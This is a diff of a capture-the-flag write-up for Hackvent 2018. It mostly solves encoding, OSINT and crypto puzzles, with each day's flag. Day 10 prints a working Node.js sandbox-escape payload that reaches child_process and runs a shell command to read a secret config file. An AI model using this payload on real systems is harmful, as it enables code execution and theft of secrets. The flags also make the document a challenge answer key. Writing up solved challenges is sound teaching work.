@@ -1,9 +1,11 @@
 # hackvent 2018
 
-## day 01
+## day 01 - Just Another Bar Code
 **Description:**
 
 After a decade of monochromity, Santa has finally updated his infrastructure with color displays. With the new color code, the gift logistic robots can now handle many more gifts:
+
+![](images/day01.png)
 
 **Solution:**
 
@@ -14,7 +16,7 @@ Using a JAB code decoder (https://jabcode.org/scan) we get the flag:
 
 ```HV18-L3ts-5t4r-7Th3-Phun-G33k```
 
-## day 02
+## day 02 - Me
 **Solution:**
 
 Our input string from the challenge is in octal encoding format:
@@ -33,7 +35,7 @@ Using the decoder from http://kryptografie.de/kryptografie/chiffre/14-segment.ht
 
 ```HL18-7QTH-JZ1K-JKSD-GPEB-GJPU```
 
-## day 03
+## day 03 - Catch me
 **Solution:**
 
 Analysing the page source we found a hex encoded string. The first part was a trick but decoding the second part
@@ -44,7 +46,7 @@ we get our flag:
 
 ```HV18-pFAT-O1Dl-HjVp-jJNE-Zju8```
 
-## day 04
+## day 04 - pirating like in the 90ies
 **Solution:**
 
 Using the tool dial-a-pirate from the old game monkey island you can get the requested years by combining the faces.
@@ -59,7 +61,7 @@ Flag:
 
 ```HV18-5o9x-4geL-7hkJ-wc4A-xp8F```
 
-## day 05
+## day 05 - OSINT 1
 **Solution:**
 
 Using crt.sh and criteria “%hackvent.org” you get certificates for osintiscoolisntit.hackvent.org and www.hackvent.org
@@ -68,7 +70,7 @@ You can find the flag by browsing to osintiscoolisntit.hackvent.org:
 
 ```HV18-0Sin-tI5S-R34l-lyC0-oo0L```
 
-## day 06
+## day 06 - Mondrian 
 **Solution:**
 
 Piet (named after painter Piet Mondrian) is one of the most known esoteric programming languages, which uses images as source code.
@@ -77,7 +79,7 @@ Using the piet code decoder (https://www.bertnase.de/npiet/npiet-execute.php) on
 
 ```HV18-M4ke-S0m3-R3Al-N1c3-artZ```
 
-## day 07
+## day 07 - flappy.pl
 **Solution:**
 
 The perl script is a flappy bird game.  You have to pass the gates using the space key to get all the flags.
@@ -88,7 +90,7 @@ Flag:
 
 ```HV18-bMnF-racH-XdMC-xSJJ-I2fL```
 
-## day 08
+## day 08 - Advent Snail
 **Solution:**
 
 I assumed the box represents a qrcode, just not in the right order.
@@ -177,7 +179,7 @@ Decoding the new image with a qr decoder we get the flag:
 
 ```HV18-$$nn-@@11-LLr0-B1ne```
 
-## day 09
+## day 09 - fake xmass balls
 **Solution:**
 
 A png with a yellow ball is given: https://hackvent.hacking-lab.com/medium-64.png
@@ -192,18 +194,70 @@ The output image diff.png is obiviously a qrcode which has to be adjusted using 
 
 Flag:
 
-HV18-PpTR-Qri5-3nOI-n51a-42gJ
+```HV18-PpTR-Qri5-3nOI-n51a-42gJ```
 
-## day 11
+## day 10 - _ Run, Node, Run
+**Description:**
+
+Santa has practiced his nodejs skills and wants his little elves to practice it as well, so the kids can get the web-app they wish for.
+He made a little practice-sandbox for his elves. Can you break out?
+Location: http://whale.hacking-lab.com:3000/
+
+Attached source code:
+```
+const {flag, port} = require("./config.json");
+const sandbox = require("sandbox");
+const app = require("express")();
+ 
+app.use(require('body-parser').urlencoded({ extended: false }));
+ 
+app.get("/", (req, res) => res.sendFile(__dirname+"/index.html"));
+app.get("/code", (req, res) => res.sendFile(__filename));
+ 
+app.post("/run", (req, res) => {
+ 
+	if (!req.body.run) {
+		res.json({success: false, result: "No code provided"});
+		return;
+	}
+ 
+	let boiler = "const flag_" + require("randomstring").generate(64) + "=\"" + flag + "\";\n";
+ 
+	new sandbox().run(boiler + req.body.run, (out) => res.json({success: true, result: out.result}));
+ 
+});
+ 
+app.listen(port);
+```
+
+**Solution:**
+
+The hint tells us that we need to escape the sandbox. Searching through the repository sandbox (author gf3) we found an interesting issue https://github.com/gf3/sandbox/issues/50.
+
+Testing the issue with following code in the provided editor:
+
+```new Function("return (this.constructor.constructor('return (this.process.mainModule.constructor._load)')())")()("child_process").execSync("cat config.json")```
+
+We get the flag from config.json:
+```
+{
+"flag":"HV18-YtH3-S4nD-bx5A-Nt4G",
+"port":3000
+}
+```
+
+## day 11 - Crypt-o-Math 3.0
 **Solution:**
 
 Similiar challenge to last year.
-If you use a solution from last year you get:
-485631382d4288bb2cdf615fc4576b25ba2ee4c74f5e8598ba6bbdfae8f
-First part looks good since 485631382d is "HV18-" but the rest doesn't make sense.
+If you use the solution from last year you get:
+
+```485631382d4288bb2cdf615fc4576b25ba2ee4c74f5e8598ba6bbdfae8f```
+
+First part looks good since hex string *485631382d* is *HV18-* in ascii but the rest doesn't seem as a part of the flag.
 
 The solution is to try to add the modulo "p" to "a" x number of times.
-I’ve used the script from author mcia and brute forced till I get a valid flag starting with  485631382d.
+I’ve used the script from author mcia and brute forced till I get a valid flag starting with *485631382d*.
 
 ```python
 #!/usr/bin/env python3
@@ -234,12 +288,23 @@ for i in range(1,3000):
     break
 ```
 
-Converting 485631382d784c76592d54654e542d596745682d7742754c2d6246667a0000 to ascii we get the flag:
+Converting **485631382d784c76592d54654e542d596745682d7742754c2d6246667a0000** to ascii we get the flag:
 
 ```HV18-xLvY-TeNT-YgEh-wBuL-bFfz```
 
+## day 13 - flappy’s revenge
+**Solution:**
 
-## day 14
+I wrote a python script which is not very effective but I get the flag after many tries.
+
+tbd
+
+Flag:
+```HV18-9hYf-LSY1-hWdZ-496n-Mbda```
+
+
+
+## day 14 - power in the shell
 **Description:**
 
 seems to be an easy one … or wait, what?
@@ -262,11 +327,9 @@ if ($PSVersionTable.PSVersion.Major -gt 2)
 
 **Solution:**
 
-The challenge was about Rabin cryptosystem.
+The challenge was about Rabin cryptosystem (as RSA with e=2)
 
-# https://en.wikipedia.org/wiki/Rabin_cryptosystem
-# as RSA with e=2
-
+https://en.wikipedia.org/wiki/Rabin_cryptosystem
 
 ```python
 # original script source http://n3k0sec.top/2018/02/09/RSA%E4%BE%8B%E9%A2%98
@@ -309,3 +372,26 @@ run(x4)
 Flag:
 
 ```HV18-DzKn-62Qz-dAab-fEou-ImjY```
+
+## day 16 - Pay 100 Bitcoins
+**Description:**
+
+It changed the host. Fortunately it doesn’t do the full job … so there’s hope. Get the things straight again and find the flag.
+
+The OS is encrypted, but you know the key: IWillNeverGetAVirus
+
+Download the image here: local
+
+**Solution:**
+
+Provided is a OVA image. Import the OVA image into virtualbox. If you start the VM, you get a Petya screen but you can't do anything with it. 
+
+The disk of the VM contains 2 volumes. Mount the vmdk file on another Linux system and decrypt the 94MB volume with the provided password **IWillNeverGetAVirus**.
+
+Now we can simply grep through the mounted volume:
+
+```bash
+cd /mnt/volumex
+grep -ri "HV18" .
+./etc/motd:Your flag is HV18-622q-gxxe-CGni-X4fT-wQKw```
+
